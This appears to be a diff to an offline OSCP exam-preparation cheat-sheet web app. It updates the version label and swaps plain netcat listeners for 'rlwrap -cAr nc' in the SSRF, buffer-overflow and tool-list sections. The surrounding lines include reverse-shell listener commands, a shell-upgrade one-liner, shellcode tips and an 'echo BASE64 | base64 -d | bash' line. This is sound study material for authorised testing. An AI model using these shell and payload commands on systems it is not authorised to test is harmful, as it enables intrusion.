@@ -472,7 +472,7 @@ Return trigger:"></textarea>
 <button class="btn" id="backTopBtn" type="button" title="Back to top">↑ Top</button>
 
 <div class="top">
-  <div class="brand">🔐 OSCP Exam OS</div><div class="badge">V28 · EXAM ONLY · OFFLINE · NO AI</div><button class="topTargetContext" id="topTargetContext" type="button" title="Open current target">No target</button>
+  <div class="brand">🔐 OSCP Exam OS</div><div class="badge">V29 · EXAM ONLY · OFFLINE · NO AI</div><button class="topTargetContext" id="topTargetContext" type="button" title="Open current target">No target</button>
   <div class="searchbar"><span class="searchIcon">⌕</span><input id="globalSearch" autocomplete="off" placeholder="Search: seimp, 445, clock skew, [AD:ADCS]…"><span class="kbd">Ctrl K</span></div>
   <div class="row" id="historyNavControls" style="gap:5px;flex-wrap:nowrap">
     <button class="btn" id="navBackBtn" type="button" title="Back to previous app view (Alt+Left)" aria-label="Back">Back</button>
@@ -928,7 +928,7 @@ state-changing AD abuse
 
 
 <section id="serviceRouterView" class="view">
- <div class="hero serviceRouterHero"><div><h1>Service-First Router <span class="chip">V28</span></h1><div class="muted">Paste a strict port list or real Nmap/Masscan output. TCP/UDP, state and service names are preserved; unrelated numbers are ignored.</div></div><div class="chips"><span class="chip">ALT+Q</span><span class="chip">OFFLINE</span><span class="chip">NO BLIND SPRAY</span></div></div>
+ <div class="hero serviceRouterHero"><div><h1>Service-First Router <span class="chip">V29</span></h1><div class="muted">Paste a strict port list or real Nmap/Masscan output. TCP/UDP, state and service names are preserved; unrelated numbers are ignored.</div></div><div class="chips"><span class="chip">ALT+Q</span><span class="chip">OFFLINE</span><span class="chip">NO BLIND SPRAY</span></div></div>
  <div class="grid">
   <div class="card span12"><h2>1 · Turn scan output into a queue</h2><div class="serviceRouterControls"><label><span class="tiny">Strict port list or scan output</span><textarea id="serviceRouterInput" spellcheck="false" placeholder="22,80,445&#10;53/udp,161/udp,445/tcp&#10;or paste Nmap / grepable / XML / Masscan output"></textarea></label><button class="btn primary" id="serviceRouterBuild" type="button">Build queue</button><button class="btn" id="serviceRouterCopy" type="button">Copy queue</button><button class="btn" id="serviceRouterLoadTarget" type="button">Load active target</button><button class="btn" id="serviceRouterSaveTarget" type="button">Save to active target</button></div><div id="serviceParseSummary" class="serviceParseSummary muted">Parser waits for a strict port list or recognized scan format.</div><div id="serviceRoleHints"></div><div id="serviceQueue" class="serviceQueue"><div class="muted">No ports parsed yet.</div></div></div>
   <div class="card span7"><h2>2 · First-pass queue</h2><pre id="serviceFirstPassQueue" class="firstPassQueue">Paste ports above. The queue will favor identity, anonymous/default access, source/config/backups, credentials, and manual protocol truth before version-only CVE hunting.</pre><p class="tiny">If a tool fails, do not immediately swap tools. First decide whether the failure is DNS, auth format, TLS, protocol negotiation, permissions, routing, or an actual negative result.</p></div>
@@ -4722,7 +4722,7 @@ echo BASE64 | base64 -d | bash
 <summary>🔁 6.6 SSRF --- Server-Side Request Forgery</summary>
 <p><code>[WEB:SSRF]</code></p>
 <pre class="ref-code"><code class="language-bash"># ── BASIC DETECTION ───────────────────────────────────────────
-# Start listener: nc -nvlp 80
+# Start listener: rlwrap -cAr nc -nvlp 80
 url=http://LHOST/test
 url=http://LHOST:80/test
 # If you get connection → SSRF confirmed
@@ -9144,9 +9144,8 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
     print("[+] Done! Check your listener...")
 </code></pre>
 <pre class="ref-code"><code class="language-bash"># Start listener BEFORE running exploit:
-nc -nvlp YOUR_LPORT
-# Or:
-rlwrap nc -nvlp YOUR_LPORT    # For arrow keys in shell
+rlwrap -cAr nc -nvlp YOUR_LPORT
+# -cAr gives history and better line editing in the interactive shell
 </code></pre>
 </details>
 <details id="ref-17-8-mona-quick-reference-all-commands">
@@ -9224,7 +9223,7 @@ PRO TIPS:
   - Verify ESP address fresh each run — may differ by small amount
   - 16 NOP bytes before shellcode is standard; increase if issues
   - Generate shellcode with -f python for cleaner copy-paste
-  - Use rlwrap nc -nvlp PORT for better shell interaction
+  - Use rlwrap -cAr nc -nvlp PORT for better shell interaction
 </code></pre>
 </details>
 <hr/>
@@ -12121,7 +12120,7 @@ const TOOL_ARSENAL=[
  ta('scp','scp / sftp','File Transfer','core','SSH is available and encrypted transfer is simplest.','scp ./file $USER@$IP:/tmp/file','sftp, rsync-over-SSH or HTTP.'),
 
  ta('shell-upgrade','script / Python PTY','Shell Handling','core','A Unix reverse shell lacks job control, TTY or sane terminal behavior.','python3 -c "import pty; pty.spawn(\'/bin/bash\')"\nscript -qc /bin/bash /dev/null','socat PTY, rlwrap on the listener, then stty rows/cols.'),
- ta('listeners','rlwrap / nc / ncat','Shell Handling','core','Receive a basic callback with predictable logging/line editing.','rlwrap -cAr nc -lvnp $LPORT\nncat -lvnp $LPORT --keep-open','socat or an allowed multi/handler without Meterpreter on non-selected targets.')
+ ta('listeners','rlwrap / nc / ncat','Shell Handling','core','Receive a basic callback with predictable logging/line editing.','rlwrap -cAr nc -lvnp $LPORT\nrlwrap -cAr ncat -lvnp $LPORT --keep-open','socat or an allowed multi/handler without Meterpreter on non-selected targets.')
 ];
 
 const BEST_TOOL_IDS=new Set([
